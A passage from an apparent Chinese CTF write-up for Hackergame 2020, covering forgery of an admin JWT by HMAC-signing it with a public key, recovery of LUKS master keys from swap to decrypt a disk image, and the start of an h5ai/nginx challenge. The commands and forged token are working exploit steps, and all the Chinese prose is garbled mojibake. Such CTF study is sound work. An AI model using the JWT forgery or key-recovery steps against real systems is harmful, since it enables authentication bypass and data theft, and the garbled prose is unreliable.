4546760a46434c502f3355337230464d7753652f4650486d7435666a417473476c5a4c6a2b625a736777466c6c59654439305651553844732b4b6b434177454141513d3d0a2d2d2d2d2d454e4420525341205055424c4943204b45592d2d2d2d2d0a<span class="token punctuation">(</span>stdin<span class="token punctuation">)</span><span class="token operator">=</span> 6b218e036017e7e9d3679add51314fe3fca177b2bdc0316b5944ac6aa965addc</code></pre><p>æœ€åä¸€è¡Œå³å¾—åˆ°çš„ HMAC signature ç»“æœï¼Œå†å°†è¿™ä¸ª ASCII hex signature è½¬æ¢ä¸º JWT formatã€‚</p><blockquote><p><code>=</code>è¢«çœç•¥ã€<code>+</code>æ›¿æ¢æˆ<code>-</code>ï¼Œ<code>/</code>æ›¿æ¢æˆ<code>_</code> ã€‚ï¼ˆBase64URL ç®—æ³•ï¼‰</p></blockquote><p>Python çš„ä¸€è¡Œä»£ç å®ç°ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ python -c <span class="token string">"exec(<span class="token entity" title="\&quot;">\"</span>import base64, binascii<span class="token entity" title="\n">\n</span>print base64.urlsafe_b64encode(binascii.a2b_hex('6b218e036017e7e9d3679add51314fe3fca177b2bdc0316b5944ac6aa965addc')).replace('=','')<span class="token entity" title="\&quot;">\"</span>)"</span>ayGOA2AX5-nTZ5rdUTFP4_yhd7K9wDFrWUSsaqllrdw</code></pre><p>æœ€åæ‹¼æ¥å¾—åˆ° JWTã€‚</p><pre class="language-none"><code class="language-none">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDM5OTY3MX0.ayGOA2AX5-nTZ5rdUTFP4_yhd7K9wDFrWUSsaqllrdw</code></pre><p>æŠŠè¿™ä¸ªæ”¾åˆ° Authorization é‡Œã€‚åˆ«å¿˜äº† Hg-Tokenã€‚</p><p>æœ€åå¾—åˆ° flagã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103181836118.png" alt="flag"></p><p><code>flag{just_A_simple_Json_Web_T0ken_exp1oit_xxxxx}</code></p><hr><h2 id="å®¤å‹çš„åŠ å¯†ç¡¬ç›˜"><a href="#å®¤å‹çš„åŠ å¯†ç¡¬ç›˜" class="headerlink" title="å®¤å‹çš„åŠ å¯†ç¡¬ç›˜"></a>å®¤å‹çš„åŠ å¯†ç¡¬ç›˜</h2><p><em>ï¼ˆå¤ç°ï¼‰</em></p><blockquote><p>ã€Œæˆ‘çš„å®¶ç›®å½•æ˜¯ 512 ä½ AES åŠ å¯†çš„ï¼Œå°±ç®—ç”µè„‘ç»™åˆ«äººæˆ‘çš„ç§˜å¯†ä¹Ÿä¸ä¼šæ³„æ¼â€¦â€¦ã€ä½ çš„å®¤å‹åœ¨å€Ÿä½ çœ‹ä»–è£…ç€ Linux çš„æ–°ç”µè„‘æ—¶è¿™ä¹ˆè¯´é“ã€‚ä½ ä¸ä¿¡ï¼Œäºæ˜¯å·å·ä» U ç›˜å¯åŠ¨ï¼Œæ‹·å‡ºäº†ä»–ç¡¬ç›˜çš„ä¸€éƒ¨åˆ†å†…å®¹ã€‚</p></blockquote><p>è§£å‹å‡ºæ¥ä¸€ä¸ª img æ–‡ä»¶ï¼Œé¦–å…ˆæ‹¿ WinHex çœ‹ä¸€ä¸‹ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107184631641.png" alt="winhex"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107184704003.png" alt="åˆ†åŒº1"></p><p>åˆ†åŒº1é‡Œæœ‰ä¸ª keyfileï¼Œå†…å®¹ä¸º</p><pre class="language-none"><code class="language-none">I'm not that stupid to put plaintext key in /boot!</code></pre><p>å•Šè¿™ã€‚</p><p>åˆ†åŒº2ä¸çŸ¥é“æ˜¯å•¥ã€‚</p><p>åˆ†åŒº3åº”è¯¥å°±æ˜¯éœ€è¦ç ´è§£çš„åŠ å¯†éƒ¨åˆ†äº†ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107184928622.png" alt="åˆ†åŒº3"></p><p>åˆ†åŒº4æ„Ÿè§‰åƒæ˜¯æ ¹ç›®å½•ï¼Œä¸å…¨ã€‚</p><p>ç„¶ååœ¨ Linux é‡Œæ‰”ç»™ fdisk çœ‹ä¸€ä¸‹ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">fdisk</span> roommates_disk_part.img Welcome to <span class="token function">fdisk</span> <span class="token punctuation">(</span>util-linux <span class="token number">2.31</span>.1<span class="token punctuation">)</span>.Changes will remain <span class="token keyword">in</span> memory only, <span class="token keyword">until</span> you decide to <span class="token function">write</span> them.Be careful before using the <span class="token function">write</span> command.Command <span class="token punctuation">(</span>m <span class="token keyword">for</span> <span class="token builtin class-name">help</span><span class="token punctuation">)</span>: pDisk roommates_disk_part.img: <span class="token number">2</span> GiB, <span class="token number">2147483648</span> bytes, <span class="token number">4194304</span> sectorsUnits: sectors of <span class="token number">1</span> * <span class="token number">512</span> <span class="token operator">=</span> <span class="token number">512</span> bytesSector size <span class="token punctuation">(</span>logical/physical<span class="token punctuation">)</span>: <span class="token number">512</span> bytes / <span class="token number">512</span> bytesI/O size <span class="token punctuation">(</span>minimum/optimal<span class="token punctuation">)</span>: <span class="token number">512</span> bytes / <span class="token number">512</span> bytesDisklabel type: dosDisk identifier: 0xa4ee910bDevice                   Boot   Start      End  Sectors  Size Id Typeroommates_disk_part.img1 *       <span class="token number">2048</span>   <span class="token number">391167</span>   <span class="token number">389120</span>  190M <span class="token number">83</span> Linuxroommates_disk_part.img2       <span class="token number">393214</span> <span class="token number">16775167</span> <span class="token number">16381954</span>  <span class="token number">7</span>.8G  <span class="token number">5</span> Extendedroommates_disk_part.img5       <span class="token number">393216</span>  <span class="token number">1890303</span>  <span class="token number">1497088</span>  731M <span class="token number">82</span> Linux swap / Solarisroommates_disk_part.img6      <span class="token number">1892352</span>  <span class="token number">3891199</span>  <span class="token number">1998848</span>  976M <span class="token number">83</span> Linuxroommates_disk_part.img7      <span class="token number">3893248</span> <span class="token number">16775167</span> <span class="token number">12881920</span>  <span class="token number">6</span>.1G <span class="token number">83</span> Linux</code></pre><p>å¯ä»¥çœ‹åˆ°æœ‰ swap äº¤æ¢åˆ†åŒºï¼Œä»¥åŠä¸å…¨çš„ Linux åˆ†åŒºï¼Ÿè€Œä¸”ç›´æ¥æŒ‚è½½ä¹ŸæŒ‚ä¸ä¸Šã€‚</p><p>æœäº†ä¸€ä¸‹ <strong>LUKS åŠ å¯†</strong>ç›¸å…³çš„æ–‡ç« ï¼Œæ‰¾åˆ°äº†å›½å¤–å¸ˆå‚…çš„ WriteUpï¼Œå‚è€ƒï¼š</p><p><a href="https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks2/">[Forensics] BsidesSF 2019 - goodluks2</a></p><p><a href="https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks3/">[Forensics] BsidesSF 2019 - goodluks3</a></p><p>é¦–å…ˆç”¨ <strong>aeskeyfind</strong> è¿™ä¸ªå·¥å…·æ‰¾ä¸€æ‰¾ swap åˆ†åŒºé‡Œæœ‰æ²¡æœ‰æ®‹ç•™çš„ AES Keyã€‚å‘ç°æœç„¶æœ‰ï¼Œä½†æ˜¯ä¸€å †ã€‚ã€‚</p><p>ï¼ˆæœ¬æ¥åº”è¯¥å…ˆæŠŠè¿™å‡ ä¸ªåˆ†åŒºç”¨ <code>dd</code> ä¹‹ç±»å·¥å…·åˆ†å‰²ä¸€ä¸‹çš„ï¼Œä½†æˆ‘æ‡’äº†å˜¤å˜¤å˜¤</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ aeskeyfind roommates_disk_part.img e195501f5bf8fffe5f4c66c43249a5747875c98f9cb598c70f52a0d05f0601bcd913145b01b203ca068e48d2f40b048639d8c6f4cfe93b22c3795945ca9d9e2a000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f457895c6ffa897807497bc31320cf9bff6707e176be26a1058fa49a12ccd2762b895ea5154cea307a3f3891fd43f19c0d54ba38b8dd28519841fa818f24eaefb082c4400a34b81dbc80de81874cf03ff16d97eb9380c515d3ec48e8433d7dc64ef3b6d7b80e9ff8b13c8b801984d2c9cf6c0ca8dd342da98112f0c70f34fd5c84cdc0c14cb55bb435e75438b7d73f445ed5e90c9514b2d4264c753492bf847e89f3330a42a7f6446260df6e2f31d311e2fcfa3d6e1f4736e835b78e63c97ccc3eab90394d3e9892c87a4b2f32144c71a2b1d2e0cdefce683125d695d6ed81d6c37d7deb43c0223b8656dd6a862562a1a8360926278dc65f445eda2146844589f000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f6bc77bd328b378315a193c7dfa0d14c2f023f5565564de40a6ba66d29aedfd3d31c69dff83847a6c3c3c091e4ff6113ca5799e1b63656f0bd51bd6490c20769ce4d58f63d629f38803da3c712c5a0cc2be774b9d925d136024a181315d91ac99136ce9ce0d3f130ebe629570a08bc2ea883e451533875140027d1b3fdb5d009131c69dff83847a6c3c3c091e4ff6113ca5799e1b63656f0bd51bd6490c20769cfa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a14c82f3493f9a3381f51c394ab8532bd037db64b793057aade3d6bf67cbebf933fa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a1Keyfind progress: <span class="token number">100</span>%</code></pre><p>æˆ–è€…ç”¨ <a href="https://sourceforge.net/projects/findaes/">findaes è¿™ä¸ªå·¥å…·</a>ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ ./findaes roommates_disk_part.imgSearching roommates_disk_part.imgFound AES-256 key schedule at offset 0xc3ffde4:e1 <span class="token number">95</span> <span class="token number">50</span> 1f 5b f8 ff fe 5f 4c <span class="token number">66</span> c4 <span class="token number">32</span> <span class="token number">49</span> a5 <span class="token number">74</span> <span class="token number">78</span> <span class="token number">75</span> c9 8f 9c b5 <span class="token number">98</span> c7 0f <span class="token number">52</span> a0 d0 5f 06 01 <span class="token function">bc</span>Found AES-256 key schedule at offset 0xc6529d8:d9 <span class="token number">13</span> <span class="token number">14</span> 5b 01 b2 03 ca 06 8e <span class="token number">48</span> d2 f4 0b 04 <span class="token number">86</span> <span class="token number">39</span> d8 c6 f4 cf e9 3b <span class="token number">22</span> c3 <span class="token number">79</span> <span class="token number">59</span> <span class="token number">45</span> ca 9d 9e 2aFound AES-256 key schedule at offset 0xc652b08:00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f <span class="token number">10</span> <span class="token number">11</span> <span class="token number">12</span> <span class="token number">13</span> <span class="token number">14</span> <span class="token number">15</span> <span class="token number">16</span> <span class="token number">17</span> <span class="token number">18</span> <span class="token number">19</span> 1a 1b 1c 1d 1e 1fFound AES-256 key schedule at offset 0xc652bfc:<span class="token number">45</span> <span class="token number">78</span> <span class="token number">95</span> c6 ff a8 <span class="token number">97</span> <span class="token number">80</span> <span class="token number">74</span> <span class="token number">97</span> <span class="token function">bc</span> <span class="token number">31</span> <span class="token number">32</span> 0c f9 bf f6 <span class="token number">70</span> 7e <span class="token number">17</span> 6b e2 6a <span class="token number">10</span> <span class="token number">58</span> fa <span class="token number">49</span> a1 2c <span class="token builtin class-name">cd</span> <span class="token number">27</span> <span class="token number">62</span>Found AES-256 key schedule at offset 0xc73bde4:b8 <span class="token number">95</span> ea <span class="token number">51</span> <span class="token number">54</span> ce a3 07 a3 f3 <span class="token number">89</span> 1f d4 3f <span class="token number">19</span> c0 d5 4b a3 8b 8d d2 <span class="token number">85</span> <span class="token number">19</span> <span class="token number">84</span> 1f a8 <span class="token number">18</span> f2 4e ae fbFound AES-256 key schedule at offset 0xc7aade4:08 2c <span class="token number">44</span> 00 a3 4b <span class="token number">81</span> db c8 0d e8 <span class="token number">18</span> <span class="token number">74</span> cf 03 ff <span class="token number">16</span> d9 7e b9 <span class="token number">38</span> 0c <span class="token number">51</span> 5d 3e c4 8e <span class="token number">84</span> <span class="token number">33</span> d7 <span class="token function">dc</span> <span class="token number">64</span>Found AES-256 key schedule at offset 0xcbffde4:ef 3b 6d 7b <span class="token number">80</span> e9 ff 8b <span class="token number">13</span> c8 b8 01 <span class="token number">98</span> 4d 2c 9c f6 c0 ca 8d d3 <span class="token number">42</span> da <span class="token number">98</span> <span class="token number">11</span> 2f 0c <span class="token number">70</span> f3 4f d5 c8Found AES-256 key schedule at offset 0xfd13de4:4c <span class="token function">dc</span> 0c <span class="token number">14</span> cb <span class="token number">55</span> bb <span class="token number">43</span> 5e <span class="token number">75</span> <span class="token number">43</span> 8b 7d <span class="token number">73</span> f4 <span class="token number">45</span> ed 5e <span class="token number">90</span> c9 <span class="token number">51</span> 4b 2d <span class="token number">42</span> <span class="token number">64</span> c7 <span class="token number">53</span> <span class="token number">49</span> 2b f8 <span class="token number">47</span> e8Found AES-256 key schedule at offset 0x101efde4:9f <span class="token number">33</span> <span class="token number">30</span> a4 2a 7f <span class="token number">64</span> <span class="token number">46</span> <span class="token number">26</span> 0d f6 e2 f3 1d <span class="token number">31</span> 1e 2f cf a3 d6 e1 f4 <span class="token number">73</span> 6e <span class="token number">83</span> 5b <span class="token number">78</span> e6 3c <span class="token number">97</span> cc c3Found AES-256 key schedule at offset 0x110d5de4:ea b9 03 <span class="token number">94</span> d3 e9 <span class="token number">89</span> 2c <span class="token number">87</span> a4 b2 f3 <span class="token number">21</span> <span class="token number">44</span> c7 1a 2b 1d 2e 0c de fc e6 <span class="token number">83</span> <span class="token number">12</span> 5d <span class="token number">69</span> 5d 6e d8 1d 6cFound AES-256 key schedule at offset 0x1337c9d8:<span class="token number">37</span> d7 de b4 3c 02 <span class="token number">23</span> b8 <span class="token number">65</span> 6d d6 a8 <span class="token number">62</span> <span class="token number">56</span> 2a 1a <span class="token number">83</span> <span class="token number">60</span> <span class="token number">92</span> <span class="token number">62</span> <span class="token number">78</span> <span class="token function">dc</span> <span class="token number">65</span> f4 <span class="token number">45</span> ed a2 <span class="token number">14</span> <span class="token number">68</span> <span class="token number">44</span> <span class="token number">58</span> 9fFound AES-256 key schedule at offset 0x1337cb08:00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f <span class="token number">10</span> <span class="token number">11</span> <span class="token number">12</span> <span class="token number">13</span> <span class="token number">14</span> <span class="token number">15</span> <span class="token number">16</span> <span class="token number">17</span> <span class="token number">18</span> <span class="token number">19</span> 1a 1b 1c 1d 1e 1fFound AES-256 key schedule at offset 0x1337cbfc:6b c7 7b d3 <span class="token number">28</span> b3 <span class="token number">78</span> <span class="token number">31</span> 5a <span class="token number">19</span> 3c 7d fa 0d <span class="token number">14</span> c2 f0 <span class="token number">23</span> f5 <span class="token number">56</span> <span class="token number">55</span> <span class="token number">64</span> de <span class="token number">40</span> a6 ba <span class="token number">66</span> d2 9a ed fd 3dFound AES-256 key schedule at offset 0x14e67de4:<span class="token number">31</span> c6 9d ff <span class="token number">83</span> <span class="token number">84</span> 7a 6c 3c 3c 09 1e 4f f6 <span class="token number">11</span> 3c a5 <span class="token number">79</span> 9e 1b <span class="token number">63</span> <span class="token number">65</span> 6f 0b d5 1b d6 <span class="token number">49</span> 0c <span class="token number">20</span> <span class="token number">76</span> 9cFound AES-256 key schedule at offset 0x1618ca1a:e4 d5 8f <span class="token number">63</span> d6 <span class="token number">29</span> f3 <span class="token number">88</span> 03 da 3c <span class="token number">71</span> 2c 5a 0c c2 be <span class="token number">77</span> 4b 9d <span class="token number">92</span> 5d <span class="token number">13</span> <span class="token number">60</span> <span class="token number">24</span> a1 <span class="token number">81</span> <span class="token number">31</span> 5d <span class="token number">91</span> ac <span class="token number">99</span>Found AES-256 key schedule at offset 0x1618cc0e:<span class="token number">13</span> 6c e9 ce 0d 3f <span class="token number">13</span> 0e be <span class="token number">62</span> <span class="token number">95</span> <span class="token number">70</span> a0 8b c2 ea <span class="token number">88</span> 3e <span class="token number">45</span> <span class="token number">15</span> <span class="token number">33</span> <span class="token number">87</span> <span class="token number">51</span> <span class="token number">40</span> 02 7d 1b 3f db 5d 00 <span class="token number">91</span>Found AES-256 key schedule at offset 0x1632db50:<span class="token number">31</span> c6 9d ff <span class="token number">83</span> <span class="token number">84</span> 7a 6c 3c 3c 09 1e 4f f6 <span class="token number">11</span> 3c a5 <span class="token number">79</span> 9e 1b <span class="token number">63</span> <span class="token number">65</span> 6f 0b d5 1b d6 <span class="token number">49</span> 0c <span class="token number">20</span> <span class="token number">76</span> 9cFound AES-256 key schedule at offset 0x171c873a:fa 01 a9 <span class="token number">80</span> <span class="token number">89</span> a3 8f <span class="token number">60</span> 6c <span class="token number">14</span> <span class="token number">86</span> <span class="token number">94</span> e7 a3 <span class="token number">50</span> 9a ac cf c1 <span class="token number">65</span> 06 8e d6 7f <span class="token number">57</span> <span class="token number">15</span> <span class="token number">38</span> 4b <span class="token number">93</span> e5 6a a6Found AES-256 key schedule at offset 0x171c890d:e4 <span class="token number">58</span> <span class="token number">16</span> <span class="token number">75</span> c3 f9 <span class="token number">47</span> f7 b5 <span class="token number">37</span> a3 <span class="token function">dd</span> <span class="token number">60</span> <span class="token number">98</span> e4 a5 <span class="token number">89</span> 8b 0a <span class="token number">18</span> c2 b3 b0 f6 <span class="token number">75</span> c6 1d e4 <span class="token number">10</span> 6f c6 a1Found AES-256 key schedule at offset 0x17d08b20:4c <span class="token number">82</span> f3 <span class="token number">49</span> 3f 9a <span class="token number">33</span> <span class="token number">81</span> f5 1c <span class="token number">39</span> 4a b8 <span class="token number">53</span> 2b d0 <span class="token number">37</span> db <span class="token number">64</span> b7 <span class="token number">93</span> 05 7a ad e3 d6 bf <span class="token number">67</span> cb eb f9 <span class="token number">33</span>Found AES-256 key schedule at offset 0x19013349:fa 01 a9 <span class="token number">80</span> <span class="token number">89</span> a3 8f <span class="token number">60</span> 6c <span class="token number">14</span> <span class="token number">86</span> <span class="token number">94</span> e7 a3 <span class="token number">50</span> 9a ac cf c1 <span class="token number">65</span> 06 8e d6 7f <span class="token number">57</span> <span class="token number">15</span> <span class="token number">38</span> 4b <span class="token number">93</span> e5 6a a6Found AES-256 key schedule at offset 0x1901351c:e4 <span class="token number">58</span> <span class="token number">16</span> <span class="token number">75</span> c3 f9 <span class="token number">47</span> f7 b5 <span class="token number">37</span> a3 <span class="token function">dd</span> <span class="token number">60</span> <span class="token number">98</span> e4 a5 <span class="token number">89</span> 8b 0a <span class="token number">18</span> c2 b3 b0 f6 <span class="token number">75</span> c6 1d e4 <span class="token number">10</span> 6f c6 a1</code></pre><p>ç”¨ losetup å°†ç£ç›˜é•œåƒæ–‡ä»¶è™šæ‹Ÿæˆ loop è®¾å¤‡ã€‚</p><p>è¿™é‡Œç”¨ç¬¬ä¸‰ä¸ªåˆ†åŒºï¼Œèµ·å§‹çš„åç§»ä¸º 1892352 * 512 = 968884224 bytesã€‚</p><blockquote><p>å¾ªç¯è®¾å¤‡å¯æŠŠæ–‡ä»¶è™šæ‹ŸæˆåŒºå—è®¾å¤‡ï¼Œç±ä»¥æ¨¡æ‹Ÿæ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œè®©ç”¨æˆ·å¾—ä»¥å°†å…¶è§†ä¸ºç¡¬ç›˜é©±åŠ¨å™¨ï¼Œå…‰é©±æˆ–è½¯é©±ç­‰è®¾å¤‡ï¼Œå¹¶æŒ‚å…¥å½“ä½œç›®å½•æ¥ä½¿ç”¨ã€‚</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> losetup --offset <span class="token number">968884224</span> /dev/loop30 roommates_disk_part.img</code></pre><p>ç„¶åå¯ä»¥ç”¨ <code>ls /dev/loop*</code> çœ‹åˆ°æœ‰ loop30 äº†ã€‚</p><p>éšæ„æŠŠä¸€è¡Œçš„ AES Key æ‹¿å»è§£å¯†ï¼Œå‘ç°ä¹Ÿæ˜¯æç¤º </p><blockquote><p>Cannot read 64 bytes from keyfile key0.</p></blockquote><p>é¢˜ç›®æç¤º <strong>AES512</strong>ï¼Œè¿™é‡Œè§£å¯†å‡ºæ¥çš„ AES256 å¯†é’¥é•¿åº¦ä¸å¤Ÿã€‚äºæ˜¯å°±å¾—æŠŠä¸¤ä¸ªæ‹¼ä¸€èµ·æ‹¿å»è§£å¯†ï¼Œè€Œä¸”ç†è®ºä¸Šåº”è¯¥æ˜¯ä¸¤ä¸ªè¿ç»­çš„å¯†é’¥æ‹¼ä¸€èµ·ã€‚</p><p>ç„¶è€Œæˆ‘å°±å¡è¿™é‡Œäº†ã€‚åªæƒ³åˆ°æ­£ç€æ‹¼æ¥ï¼Œæ²¡æƒ³åˆ°åè¿‡æ¥è¿æ¥ã€‚ã€‚</p><p>å‚è€ƒå®˜æ–¹ WP ç»™çš„ <a href="https://blog.appsecco.com/breaking-full-disk-encryption-from-a-memory-dump-5a868c4fc81e"><strong>Breaking Full Disk Encryption from a Memory Dump</strong></a> ä¸€æ–‡ï¼Œç”±äºç”¨çš„æ˜¯å°ç«¯åºï¼Œè¿™é‡Œåº”è¯¥åè¿‡æ¥æ‹¼æ¥ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107202423595.png" alt="å‚è€ƒåšå®¢"></p><p>è¯•äº†åŠå¤©å‘ç°æ˜¯æœ€åä¸¤æ¡ï¼Œè€Œä¸”è¿˜å‡ºç°äº†ä¸¤æ¬¡ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a1fa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6'</span> <span class="token operator">|</span> xxd -r -p <span class="token operator">&gt;</span> key0</code></pre><p>ç„¶åç”¨ <code>key0</code> å»è§£å¯†é•œåƒã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> cryptsetup luksOpen --master-key-file key0 /dev/loop30 decrypted</code></pre><p>æ²¡æœ‰æŠ¥é”™ï¼Œç„¶åå†æŠŠè¿™ä¸ª loop ç»™æŒ‚è½½ä¸Šã€‚æœ€åè¿›å»æ‹¿åˆ° flagã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> /mnt/hackergame<span class="token function">sudo</span> <span class="token function">mount</span> /dev/mapper/decrypted /mnt/hackergame<span class="token builtin class-name">cd</span> /mnt/hackergame/<span class="token comment"># ...</span><span class="token function">cat</span> flag.txt</code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107184050381.png" alt="flag"></p><p>æœ€åå†å–æ¶ˆæŒ‚è½½ï¼Œå¸è½½ loop è®¾å¤‡ã€‚æœ‰å§‹æœ‰ç»ˆå˜›ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">umount</span> /mnt/hackergame<span class="token function">sudo</span> losetup -d /dev/loop30<span class="token function">sudo</span> <span class="token function">rm</span> -rf /mnt/hackergame</code></pre><blockquote><p>å…¶ä»– References &amp; Extensive Readingï¼š</p><p><a href="https://raksec.blogspot.com/2016/05/forensics-ctf-challenge-fbios-writeup.html">Forensics CTF challenge - FBiOS writeup</a></p><p><a href="https://g0blin.co.uk/hack-lu-ctf-2015-dr-bob-writeup/">Hack.lu CTF 2015 - Forensics 150: Dr. Bob Writeupï¼ˆè¾ƒç®€å•ï¼‰</a></p><p><a href="http://aes.online-domain-tools.com/">AES â€“ Symmetric Ciphers Online ä¸€ä¸ªåœ¨çº¿çš„ AES è§£å¯†ç½‘ç«™</a></p><p><a href="https://www.jianshu.com/p/b58449b43981">è¿…é›·ç½‘å¿ƒäº‘x86ç‰ˆè™šæ‹Ÿæœºç¡¬ç›˜è§£å¯†</a></p></blockquote><hr><h2 id="è¶…ç®€æ˜“çš„ç½‘ç›˜æœåŠ¡å™¨"><a href="#è¶…ç®€æ˜“çš„ç½‘ç›˜æœåŠ¡å™¨" class="headerlink" title="è¶…ç®€æ˜“çš„ç½‘ç›˜æœåŠ¡å™¨"></a>è¶…ç®€æ˜“çš„ç½‘ç›˜æœåŠ¡å™¨</h2><blockquote><p>ç™»å½•äº†æœåŠ¡å™¨åå°çš„å° C å¼€å§‹æ€è€ƒæŠ€æœ¯æ–¹æ¡ˆï¼šâ€œå¬è¯´ h5ai æ­å»ºäº‘ç›˜çš„æ–¹æ¡ˆæ˜¯ä¸é”™çš„ â€¦ ä½¿ç”¨ Basic Auth å¯ä»¥åšè®¿é—®æ§åˆ¶ï¼Œå¯ä»¥ä¿æŠ¤<a href="http://202.38.93.111:10120/">æ ¹ç›®å½•</a>ä¸‹çš„æ–‡ä»¶ä¸è¢«éæ³•çš„è®¿é—® â€¦ ç­‰ç­‰ï¼Œæœ‰ä¸€äº›æ–‡ä»¶æ˜¯å¯ä»¥è¢«åˆ†äº«çš„ï¼Œéœ€è¦ä¸€ä¸ª <a href="http://202.38.93.111:10120/Public">/Public</a> ç›®å½•æ¥å…±äº«æ–‡ä»¶ï¼â€</p><p>ä¸‰åˆ†é’Ÿåï¼Œå° C åŒå­¦å®Œæˆäº†ç½‘ç›˜çš„æ­å»ºã€‚ä»–æƒ³ï¼šâ€œç©ºç€æ€»ä¸å¥½ï¼Œå…ˆå¾—åœ¨äº‘ç›˜ä¸Šæ”¾ç‚¹ä¸œè¥¿ï¼â€ã€‚çŠ¹è±«ç‰‡åˆ»ï¼Œä»–æå‡ºäº†è‡ªå·±çè—äº†ä¸‰ä¸ªæœˆçš„ flag å¹¶ä¸Šä¼ åˆ°äº†äº‘ç›˜çš„<a href="http://202.38.93.111:10120/">æ ¹ç›®å½•</a>ã€‚</p></blockquote><p>è¿™é¢˜è€é¦‹äº†ï¼Œåšäº†å¥½ä¹…æ‰æ•´å‡ºæ¥ï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼Œæˆ‘è‡ªå·±çˆ¬ã€‚</p><p>è®¿é—® /Public ç›®å½•ï¼Œå¯ä»¥å¾—åˆ° <code>nginx.conf</code> ä»¥åŠ <code>Dockerfile</code>ã€‚</p><p>å…³é”®ä»£ç ï¼š</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM alpine:latestEXPOSE 10120WORKDIR /var/www/htmlRUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories \    &amp;&amp; apk add nginx supervisor php7-fpm php7-session php7-json php7-gd php7-exif git wget unzip zip\    &amp;&amp; mkdir -p /var/www/html/Public \    &amp;&amp; wget https://release.larsjung.de/h5ai/h5ai-0.29.2.zip \    &amp;&amp; unzip h5ai-0.29.2.zip \    &amp;&amp; cp -rp /var/www/html/_h5ai  /var/www/html/Public/_h5ai \    &amp;&amp; rm h5ai-0.29.2.zip \    &amp;&amp; mkdir /run/nginxADD ./supervisord.conf /etc/supervisor/conf.d/supervisord.confADD ./nginx.conf /etc/nginx/nginx.confADD ./php.ini /etc/php7/php.iniRUN rm /etc/nginx/conf.d/default.confRUN chown -R nobody.nobody /var/www/html &amp;&amp; \  chown -R nobody.nobody /run &amp;&amp; \  chown -R nobody.nobody /var/lib/nginx &amp;&amp; \  chown -R nobody.nobody /var/log/nginx &amp;&amp; \  chown -R nobody.nobody /var/log/php7USER nobodyADD --chown=nobody ./flag.txt /var/www/html/ADD --chown=nobody ./dockerfile ./nginx.conf /var/www/html/Public/CMD ["/usr/bin/supervisord", "-c", "/etc/supervisor/conf.d/supervisord.conf"]</code></pre><p><code>cp -rp /var/www/html/_h5ai  /var/www/html/Public/_h5ai</code>ï¼Œè¿™é‡Œçœ‹å¾—å‡ºæ¥**æœ‰ä¸¤ä¸ª <code>_h5ai</code>**ï¼Œå®é™…è®¿é—®ä¹Ÿæ˜¯ã€‚</p><pre class="language-nginx" data-language="nginx"><code class="language-nginx"><span class="token keyword">server</span><span class="token punctuation">{</span>    <span class="token comment"># Docker å†…éƒ¨çš„åœ°å€ï¼Œæ— å…³ç´§è¦</span>    <span class="token keyword">listen</span> <span class="token number">10120</span><span class="token punctuation">;</span>    <span class="token keyword">server_name</span> _<span class="token punctuation">;</span>    <span class="token keyword">root</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token punctuation">;</span>    <span class="token keyword">index</span> <span class="token keyword">index</span><span class="token punctuation">.</span>php <span class="token keyword">index</span><span class="token punctuation">.</span>html <span class="token operator">/</span>_h5ai<span class="token operator">/</span>public<span class="token operator">/</span><span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>    <span class="token comment"># _h5ai/private æ–‡ä»¶å¤¹ä¸‹çš„å†…å®¹æ˜¯ä¸å¯ç›´æ¥è®¿é—®çš„ï¼Œè®¾ç½®å±è”½</span>    <span class="token keyword">location</span> <span class="token operator">~</span> _h5ai<span class="token operator">/</span>private <span class="token punctuation">{</span>        <span class="token keyword">deny</span> all<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment"># æ ¹ç›®å½•æ˜¯ç§æœ‰ç›®å½•ï¼Œä½¿ç”¨ basic auth è¿›è¡Œè®¤è¯ï¼Œåªæœ‰æˆ‘ï¼ˆè¶…æè‡´çš„å° C)è‡ªå·±å¯ä»¥è®¿é—®</span>    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">auth_basic</span> <span class="token string">"easy h5ai. For visitors, please refer to public directory at `/Public!`"</span><span class="token punctuation">;</span>        <span class="token 